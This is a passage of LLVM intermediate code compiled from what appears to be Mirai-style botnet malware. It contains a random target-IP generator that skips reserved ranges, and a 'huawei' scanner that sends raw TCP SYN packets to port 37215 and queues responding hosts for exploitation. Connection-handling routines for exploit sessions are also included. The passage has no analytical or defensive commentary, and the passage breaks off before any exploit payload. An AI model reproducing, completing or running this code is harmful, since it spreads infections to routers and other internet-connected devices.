.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %254, %296, %212, %250, %246, %238
  %304 = load i32, i32* %1, align 4
  %305 = add nsw i32 %304, 1
  store i32 %305, i32* %1, align 4
  %306 = icmp slt i32 %305, 128
  br i1 %306, label %212, label %.loopexit150.loopexit
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_random_ip() unnamed_addr #1 {
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %1 = tail call i32 @rand_next()
  %2 = tail call i64 @time(i64* null) #8
  %3 = trunc i64 %2 to i32
  tail call void @srand(i32 %3) #8
  %4 = lshr i32 %1, 8
  %trunc = trunc i32 %1 to i8
  switch i8 %trunc, label %18 [
    i8 127, label %.critedge.backedge
    i8 0, label %.critedge.backedge
    i8 3, label %.critedge.backedge
    i8 15, label %.critedge.backedge
    i8 16, label %.critedge.backedge
    i8 56, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 -64, label %5
    i8 -84, label %8
    i8 100, label %11
    i8 -87, label %14
    i8 -58, label %15
  ]

; <label>:5:                                      ; preds = %.critedge
  %6 = and i32 %4, 255
  %7 = icmp eq i32 %6, 168
  br i1 %7, label %.critedge.backedge, label %switch.early.test.thread

; <label>:8:                                      ; preds = %.critedge
  %9 = and i32 %4, 240
  %10 = icmp eq i32 %9, 16
  br i1 %10, label %.critedge.backedge, label %switch.early.test.thread

; <label>:11:                                     ; preds = %.critedge
  %12 = and i32 %4, 255
  %.off = add nsw i32 %12, -64
  %13 = icmp ult i32 %.off, 63
  br i1 %13, label %.critedge.backedge, label %switch.early.test.thread

; <label>:14:                                     ; preds = %.critedge
  %.old = and i32 %4, 255
  %.old67 = icmp eq i32 %.old, 255
  br i1 %.old67, label %.critedge.backedge, label %switch.early.test.thread

.critedge.backedge:                               ; preds = %14, %5, %8, %11, %15, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %18, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test
  br label %.critedge

; <label>:15:                                     ; preds = %.critedge
  %16 = and i32 %4, 254
  %17 = icmp eq i32 %16, 18
  br i1 %17, label %.critedge.backedge, label %switch.early.test.thread

; <label>:18:                                     ; preds = %.critedge
  %19 = and i32 %1, 224
  %.old71 = icmp ugt i32 %19, 223
  br i1 %.old71, label %.critedge.backedge, label %switch.early.test

switch.early.test:                                ; preds = %18
  %trunc118 = trunc i32 %1 to i8
  switch i8 %trunc118, label %switch.early.test.thread [
    i8 -41, label %.critedge.backedge
    i8 -42, label %.critedge.backedge
    i8 55, label %.critedge.backedge
    i8 33, label %.critedge.backedge
    i8 30, label %.critedge.backedge
    i8 29, label %.critedge.backedge
    i8 28, label %.critedge.backedge
    i8 26, label %.critedge.backedge
    i8 22, label %.critedge.backedge
    i8 21, label %.critedge.backedge
    i8 11, label %.critedge.backedge
    i8 7, label %.critedge.backedge
    i8 6, label %.critedge.backedge
  ]

switch.early.test.thread:                         ; preds = %14, %5, %8, %11, %switch.early.test, %15
  %20 = tail call i32 @llvm.bswap.i32(i32 %1)
  %21 = tail call i32 @htonl(i32 %20) #12
  ret i32 %21
}

declare zeroext i16 @checksum_generic(i16*, i32) local_unnamed_addr #7

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) local_unnamed_addr #7

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @exploit_setup_connection(%struct.exploit_scanner_connection* nocapture) unnamed_addr #1 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = bitcast %struct.sockaddr_in* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 16, i32 4, i1 false)
  %4 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 0
  %5 = load i32, i32* %4, align 8
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %1
  %8 = tail call i32 @close(i32 %5) #8
  br label %9

; <label>:9:                                      ; preds = %1, %7
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #8
  store i32 %10, i32* %4, align 8
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %35, label %12

; <label>:12:                                     ; preds = %9
  %13 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 5
  store i32 0, i32* %13, align 4
  %14 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 6, i64 0
  tail call void @util_zero(i8* %14, i32 256)
  %15 = load i32, i32* %4, align 8
  %16 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 3, i32 0) #8
  %17 = or i32 %16, 2048
  %18 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %17) #8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 3
  %21 = load i32, i32* %20, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  store i32 %21, i32* %22, align 4
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 4
  %24 = load i16, i16* %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* @exploit_fake_time, align 4
  %27 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 1
  store i32 %26, i32* %27, align 4
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 2
  %29 = load i32, i32* %28, align 8
  %.off = add i32 %29, -3
  %switch = icmp ult i32 %.off, 2
  br i1 %switch, label %31, label %30

; <label>:30:                                     ; preds = %12
  store i32 1, i32* %28, align 8
  br label %31

; <label>:31:                                     ; preds = %12, %30
  %32 = load i32, i32* %4, align 8
  %33 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %34 = call i32 @connect(i32 %32, %struct.sockaddr* nonnull %33, i32 16) #8
  br label %35

; <label>:35:                                     ; preds = %9, %31
  ret void
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #7

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @exploit_recv_strip_null(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = sext i32 %2 to i64
  %6 = tail call i64 @recv(i32 %0, i8* %1, i64 %5, i32 %3) #8
  %7 = trunc i64 %6 to i32
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = and i64 %6, 4294967295
  %9 = add nsw i64 %wide.trip.count, -1
  %xtraiter = and i64 %6, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %14, %.lr.ph.prol.preheader
  %indvars.iv.prol = phi i64 [ %indvars.iv.next.prol, %14 ], [ 0, %.lr.ph.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %14 ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %10 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.prol
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i8 %11, 0
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %.lr.ph.prol
  store i8 65, i8* %10, align 1
  br label %14

; <label>:14:                                     ; preds = %13, %.lr.ph.prol
  %indvars.iv.next.prol = add nuw nsw i64 %indvars.iv.prol, 1
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !5

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %14
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %indvars.iv.unr = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next.prol, %.lr.ph.prol.loopexit.unr-lcssa ]
  %15 = icmp ult i64 %9, 3
  br i1 %15, label %.loopexit.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %32, %.lr.ph.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader.new ], [ %indvars.iv.next.3, %32 ]
  %16 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 0
  br i1 %18, label %19, label %.lr.ph.113

; <label>:19:                                     ; preds = %.lr.ph
  store i8 65, i8* %16, align 1
  br label %.lr.ph.113

.lr.ph.113:                                       ; preds = %.lr.ph, %19
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %20 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next
  %21 = load i8, i8* %20, align 1
  %22 = icmp eq i8 %21, 0
  br i1 %22, label %23, label %.lr.ph.214

.loopexit.loopexit.unr-lcssa:                     ; preds = %32
  br label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph.prol.loopexit, %.loopexit.loopexit.unr-lcssa
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4
  ret i32 %7

; <label>:23:                                     ; preds = %.lr.ph.113
  store i8 65, i8* %20, align 1
  br label %.lr.ph.214

.lr.ph.214:                                       ; preds = %23, %.lr.ph.113
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %24 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.1
  %25 = load i8, i8* %24, align 1
  %26 = icmp eq i8 %25, 0
  br i1 %26, label %27, label %.lr.ph.315

; <label>:27:                                     ; preds = %.lr.ph.214
  store i8 65, i8* %24, align 1
  br label %.lr.ph.315

.lr.ph.315:                                       ; preds = %27, %.lr.ph.214
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %28 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.2
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %.lr.ph.315
  store i8 65, i8* %28, align 1
  br label %32

; <label>:32:                                     ; preds = %31, %.lr.ph.315
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %exitcond.3 = icmp eq i64 %indvars.iv.next.3, %wide.trip.count
  br i1 %exitcond.3, label %.loopexit.loopexit.unr-lcssa, label %.lr.ph
}

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define void @huawei_init() local_unnamed_addr #1 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.fd_set, align 8
  %3 = alloca %struct.fd_set, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca [1514 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %9 = tail call i32 @fork() #8
  store i32 %9, i32* @huawei_scanner_pid, align 4
  %10 = icmp sgt i32 %9, 0
  %11 = icmp eq i32 %9, -1
  %or.cond = or i1 %10, %11
  br i1 %or.cond, label %12, label %13

; <label>:12:                                     ; preds = %0
  ret void

; <label>:13:                                     ; preds = %0
  %14 = tail call i32 @util_local_addr()
  store i32 %14, i32* @LOCAL_ADDR, align 4
  tail call void @rand_init()
  %15 = tail call i64 @time(i64* null) #8
  %16 = trunc i64 %15 to i32
  store i32 %16, i32* @huawei_fake_time, align 4
  %17 = tail call noalias i8* @calloc(i64 128, i64 5416) #8
  store i8* %17, i8** bitcast (%struct.exploit_scanner_connection** @conn_table to i8**), align 8
  store i32 0, i32* %1, align 4
  br label %18

; <label>:18:                                     ; preds = %13, %18
  %storemerge179 = phi i32 [ 0, %13 ], [ %26, %18 ]
  %19 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %20 = sext i32 %storemerge179 to i64
  %21 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %19, i64 %20, i32 2
  store i32 0, i32* %21, align 8
  %22 = load i32, i32* %1, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %19, i64 %23, i32 0
  store i32 -1, i32* %24, align 8
  %25 = load i32, i32* %1, align 4
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* %1, align 4
  %27 = icmp slt i32 %26, 128
  br i1 %27, label %18, label %28

; <label>:28:                                     ; preds = %18
  %29 = tail call i32 @socket(i32 2, i32 3, i32 6) #8
  store i32 %29, i32* @huawei_rsck, align 4
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %28
  tail call void @exit(i32 0) #14
  unreachable

; <label>:32:                                     ; preds = %28
  %33 = tail call i32 (i32, i32, ...) @fcntl(i32 %29, i32 3, i32 0) #8
  %34 = or i32 %33, 2048
  %35 = tail call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %34) #8
  store i32 1, i32* %1, align 4
  %36 = load i32, i32* @huawei_rsck, align 4
  %37 = bitcast i32* %1 to i8*
  %38 = call i32 @setsockopt(i32 %36, i32 0, i32 3, i8* nonnull %37, i32 4) #8
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %.preheader155.preheader, label %40

.preheader155.preheader:                          ; preds = %32
  br label %.preheader155

; <label>:40:                                     ; preds = %32
  %41 = load i32, i32* @huawei_rsck, align 4
  %42 = call i32 @close(i32 %41) #8
  call void @exit(i32 0) #14
  unreachable

.preheader155:                                    ; preds = %.preheader155.preheader, %.preheader155
  %43 = call i32 @rand_next()
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @ntohs(i16 zeroext %44) #12
  %46 = icmp ult i16 %45, 1024
  br i1 %46, label %.preheader155, label %47

; <label>:47:                                     ; preds = %.preheader155
  store i8 69, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 0), align 16
  %48 = call zeroext i16 @htons(i16 zeroext 40) #12
  store i16 %48, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 2) to i16*), align 2
  %49 = call i32 @rand_next()
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  store i8 64, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 8), align 8
  store i8 6, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 9), align 1
  %51 = call zeroext i16 @htons(i16 zeroext -28321) #12
  store i16 %51, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %44, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 20) to i16*), align 4
  %52 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %53 = and i16 %52, -241
  %54 = or i16 %53, 80
  store i16 %54, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %55 = call i32 @rand_next()
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 34) to i16*), align 2
  %57 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %58 = or i16 %57, 512
  store i16 %58, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %59 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 0
  %60 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 20
  %61 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 0
  %62 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 0
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  %64 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %65 = bitcast i32* %7 to i8*
  %66 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 16
  %67 = bitcast i8* %66 to i32*
  %68 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 9
  %69 = bitcast i8* %60 to i16*
  %70 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 22
  %71 = bitcast i8* %70 to i16*
  %72 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 32
  %73 = bitcast i8* %72 to i16*
  %74 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 28
  %75 = bitcast i8* %74 to i32*
  %76 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 12
  %77 = bitcast i8* %76 to i32*
  %78 = bitcast %struct.sockaddr_in* %5 to i8*
  %79 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %82 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  br label %.loopexit150

.loopexit150.loopexit:                            ; preds = %.loopexit
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %47
  %.0128 = phi i32 [ undef, %47 ], [ %.1129, %.loopexit150.loopexit ]
  %83 = load i32, i32* @huawei_fake_time, align 4
  %84 = icmp eq i32 %83, %.0128
  br i1 %84, label %.loopexit154, label %.preheader153

.preheader153:                                    ; preds = %.loopexit150
  store i32 0, i32* %1, align 4
  br label %85

; <label>:85:                                     ; preds = %.preheader153, %85
  call void @llvm.memset.p0i8.i64(i8* nonnull %78, i8 0, i64 16, i32 4, i1 false)
  %86 = call i32 @rand_next()
  %87 = trunc i32 %86 to i16
  store i16 %87, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  %88 = load i32, i32* @LOCAL_ADDR, align 4
  store i32 %88, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 12) to i32*), align 4
  %89 = call fastcc i32 @get_random_ip.76()
  store i32 %89, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  %90 = call zeroext i16 @checksum_generic(i16* bitcast ([40 x i8]* @huawei_scanner_rawpkt to i16*), i32 20) #8
  store i16 %90, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  store i16 %51, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  %91 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %91, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 24) to i32*), align 8
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  %92 = call zeroext i16 @htons(i16 zeroext 20) #12
  %93 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 20), i16 zeroext %92, i32 20) #8
  store i16 %93, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  store i16 2, i16* %79, align 4
  %94 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %94, i32* %80, align 4
  %95 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %95, i16* %81, align 2
  %96 = load i32, i32* @huawei_rsck, align 4
  %97 = call i64 @sendto(i32 %96, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 0), i64 40, i32 16384, %struct.sockaddr* nonnull %82, i32 16) #8
  %98 = load i32, i32* %1, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %1, align 4
  %100 = icmp slt i32 %99, 160
  br i1 %100, label %85, label %.loopexit154.loopexit

.loopexit154.loopexit:                            ; preds = %85
  br label %.loopexit154

.loopexit154:                                     ; preds = %.loopexit154.loopexit, %.loopexit150
  %.1129 = phi i32 [ %.0128, %.loopexit150 ], [ %83, %.loopexit154.loopexit ]
  %101 = tail call i32* @__errno_location() #12
  store i32 0, i32* %101, align 4
  %102 = load i32, i32* @huawei_rsck, align 4
  %103 = call i64 @recvfrom(i32 %102, i8* nonnull %59, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #8
  %104 = trunc i64 %103 to i32
  %105 = icmp slt i32 %104, 1
  br i1 %105, label %.thread, label %.lr.ph167.preheader

.lr.ph167.preheader:                              ; preds = %.loopexit154
  br label %.lr.ph167

.lr.ph167:                                        ; preds = %.lr.ph167.preheader, %.backedge152
  %106 = phi i64 [ %152, %.backedge152 ], [ %103, %.lr.ph167.preheader ]
  %.0127166 = phi i32 [ %.0127.be, %.backedge152 ], [ 0, %.lr.ph167.preheader ]
  %107 = load i32, i32* %101, align 4
  %108 = icmp eq i32 %107, 11
  br i1 %108, label %.thread.loopexit194, label %109

; <label>:109:                                    ; preds = %.lr.ph167
  %sext = shl i64 %106, 32
  %110 = ashr exact i64 %sext, 32
  %111 = icmp ult i64 %110, 40
  br i1 %111, label %.backedge152, label %112

; <label>:112:                                    ; preds = %109
  %113 = load i32, i32* %67, align 16
  %114 = load i32, i32* @LOCAL_ADDR, align 4
  %115 = icmp eq i32 %113, %114
  %116 = load i8, i8* %68, align 1
  %117 = icmp eq i8 %116, 6
  %or.cond181 = and i1 %115, %117
  %118 = load i16, i16* %69, align 4
  %119 = icmp eq i16 %118, %51
  %or.cond183 = and i1 %or.cond181, %119
  %120 = load i16, i16* %71, align 2
  %121 = icmp eq i16 %120, %44
  %or.cond185 = and i1 %or.cond183, %121
  br i1 %or.cond185, label %122, label %.backedge152

; <label>:122:                                    ; preds = %112
  %123 = load i16, i16* %73, align 16
  %124 = and i16 %123, 5888
  %125 = icmp eq i16 %124, 4608
  br i1 %125, label %126, label %.backedge152

; <label>:126:                                    ; preds = %122
  %127 = load i32, i32* %75, align 4
  %128 = call i32 @ntohl(i32 %127) #12
  %129 = add i32 %128, -1
  %130 = call i32 @htonl(i32 %129) #12
  %131 = load i32, i32* %77, align 4
  %132 = icmp eq i32 %130, %131
  br i1 %132, label %.preheader149, label %.backedge152

.preheader149:                                    ; preds = %126
  %133 = icmp slt i32 %.0127166, 128
  br i1 %133, label %.lr.ph, label %.thread.loopexit194

.lr.ph:                                           ; preds = %.preheader149
  %134 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %135 = sext i32 %.0127166 to i64
  br label %136

; <label>:136:                                    ; preds = %.lr.ph, %140
  %indvars.iv = phi i64 [ %135, %.lr.ph ], [ %indvars.iv.next, %140 ]
  %137 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %134, i64 %indvars.iv, i32 2
  %138 = load i32, i32* %137, align 8
  %139 = icmp eq i32 %138, 0
  br i1 %139, label %142, label %140

; <label>:140:                                    ; preds = %136
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %141 = icmp slt i64 %indvars.iv.next, 128
  br i1 %141, label %136, label %.thread.loopexit

; <label>:142:                                    ; preds = %136
  %143 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %134, i64 %indvars.iv
  %144 = icmp eq %struct.exploit_scanner_connection* %143, null
  br i1 %144, label %.thread.loopexit194, label %145

; <label>:145:                                    ; preds = %142
  %146 = trunc i64 %indvars.iv to i32
  %147 = load i32, i32* %77, align 4
  %148 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %134, i64 %indvars.iv, i32 3
  store i32 %147, i32* %148, align 4
  %149 = load i16, i16* %69, align 4
  %150 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %134, i64 %indvars.iv, i32 4
  store i16 %149, i16* %150, align 8
  call fastcc void @huawei_setup_connection(%struct.exploit_scanner_connection* nonnull %143)
  br label %.backedge152

.backedge152:                                     ; preds = %145, %109, %112, %126, %122
  %.0127.be = phi i32 [ %.0127166, %109 ], [ %.0127166, %112 ], [ %.0127166, %126 ], [ %146, %145 ], [ %.0127166, %122 ]
  store i32 0, i32* %101, align 4
  %151 = load i32, i32* @huawei_rsck, align 4
  %152 = call i64 @recvfrom(i32 %151, i8* nonnull %59, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #8
  %153 = trunc i64 %152 to i32
  %154 = icmp slt i32 %153, 1
  br i1 %154, label %.thread.loopexit194, label %.lr.ph167

.thread.loopexit:                                 ; preds = %140
  br label %.thread

.thread.loopexit194:                              ; preds = %.preheader149, %.lr.ph167, %.backedge152, %142
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit194, %.thread.loopexit, %.loopexit154
  %155 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %61) #8, !srcloc !6
  %156 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %62) #8, !srcloc !7
  store i32 0, i32* %1, align 4
  br label %157

; <label>:157:                                    ; preds = %.thread, %.thread145
  %.0130175 = phi i32 [ 0, %.thread ], [ %.1131, %.thread145 ]
  %.0132174 = phi i32 [ 0, %.thread ], [ %.1133, %.thread145 ]
  %storemerge136173 = phi i32 [ 0, %.thread ], [ %203, %.thread145 ]
  %158 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %159 = sext i32 %storemerge136173 to i64
  %160 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %158, i64 %159
  %161 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %158, i64 %159, i32 2
  %162 = load i32, i32* %161, align 8
  %163 = icmp eq i32 %162, 0
  br i1 %163, label %.thread145, label %164

; <label>:164:                                    ; preds = %157
  %165 = load i32, i32* @huawei_fake_time, align 4
  %166 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %158, i64 %159, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = sub i32 %165, %167
  %169 = icmp ugt i32 %168, 5
  br i1 %169, label %170, label %175

; <label>:170:                                    ; preds = %164
  %171 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %160, i64 0, i32 0
  %172 = load i32, i32* %171, align 8
  %173 = call i32 @close(i32 %172) #8
  store i32 -1, i32* %171, align 8
  store i32 0, i32* %161, align 8
